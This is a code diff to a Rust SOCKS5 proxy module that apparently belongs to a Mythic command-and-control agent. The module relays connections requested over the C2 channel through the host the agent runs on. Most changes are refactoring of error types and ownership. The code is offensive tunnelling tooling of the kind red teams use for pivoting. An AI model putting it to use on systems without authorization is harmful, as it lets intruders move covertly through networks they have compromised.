@@ -21,7 +21,6 @@ struct SocksTask {
     port: u16,
 }
 
-// If you later want typed messages end-to-end:
 #[derive(Debug, Clone, Serialize, Deserialize)]
 struct WireMsg {
     server_id: String,
@@ -59,7 +58,7 @@ fn send_data(
     server_id: &str,
     data: &[u8],
     exit: bool,
-) -> Result<(), Box<dyn Error + Send + Sync>> {
+) -> Result<(), Box<dyn Error>> {
     let packet = json!({
         "server_id": server_id,
         "data": encode(data),
@@ -70,7 +69,7 @@ fn send_data(
 }
 
 /// Parse the initial SOCKS5 CONNECT request (from Mythic payload).
-fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error + Send + Sync>> {
+fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
     if decoded.len() < 10 {
         return Err("SOCKS5 request too short".into());
     }
@@ -123,7 +122,7 @@ async fn handle_connection(
     server_id: String,
     mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
     tx_out: std_mpsc::Sender<Value>,
-) -> Result<(), Box<dyn Error + Send + Sync>> {
+) -> Result<(), Box<dyn Error>> {
     // Expect initial CONNECT frame
     let first = match sess_rx.recv().await {
         Some(v) => v,
@@ -155,7 +154,7 @@ async fn handle_connection(
     let ok = build_reply(0x00, bound);
     send_data(&tx_out, &server_id, &ok, false)?;
 
-    // Split into owned halves (requires Tokio 1.21+; works on 1.47.x)
+    // Split into owned halves
     let (mut remote_r, mut remote_w) = remote.into_split();
 
     // remote -> Mythic
@@ -215,7 +214,7 @@ async fn handle_connection(
 pub fn handle_socks(
     tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
-) -> Result<(), Box<dyn Error + Send + Sync>> {
+) -> Result<(), Box<dyn Error>> {
     // First message is the AgentTask
     let task_val = rx.recv()?;
     let task: AgentTask = serde_json::from_value(task_val)?;
@@ -229,7 +228,6 @@ pub fn handle_socks(
 
     // Bridge std::mpsc (blocking) -> tokio::mpsc (async)
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
-
     std::thread::spawn(move || {
         while let Ok(v) = rx.recv() {
             let _ = bridge_tx.send(v);
@@ -243,16 +241,19 @@ pub fn handle_socks(
         let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
 
         while let Some(msg) = bridge_rx.recv().await {
-            let Some(server_id) = msg.get("server_id").and_then(|v| v.as_str()) else { continue };
+            // Take owned copies BEFORE moving `msg` into `entry.send(msg)`
+            let server_id = match msg.get("server_id").and_then(|v| v.as_str()) {
+                Some(s) => s.to_string(),
+                None => continue,
+            };
             let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
 
             // Lazily create a session for this server_id
-            let entry = sessions.entry(server_id.to_string()).or_insert_with(|| {
+            let entry = sessions.entry(server_id.clone()).or_insert_with(|| {
                 let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
-                let sid = server_id.to_string();
+                let sid = server_id.clone();
                 let tx_out = tx.clone();
 
-                // Spawn wrapper so the spawned future returns `()`
                 tokio::spawn(async move {
                     if let Err(_e) = handle_connection(sid, sess_rx, tx_out).await {
                         // optionally log
@@ -261,12 +262,12 @@ pub fn handle_socks(
                 sess_tx
             });
 
-            // Forward message to that session
+            // Forward message to that session (moves `msg`)
             let _ = entry.send(msg);
 
             // If this message indicates exit, drop the route
             if exit {
-                sessions.remove(server_id);
+                sessions.remove(&server_id);
             }
         }
 
@@ -281,9 +282,6 @@ pub fn handle_socks(
 pub fn setup_socks(
     tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
-) -> Result<(), Box<dyn Error + Send + Sync>> {
+) -> Result<(), Box<dyn Error>> {
     handle_socks(tx, rx)
 }
-
-
- 
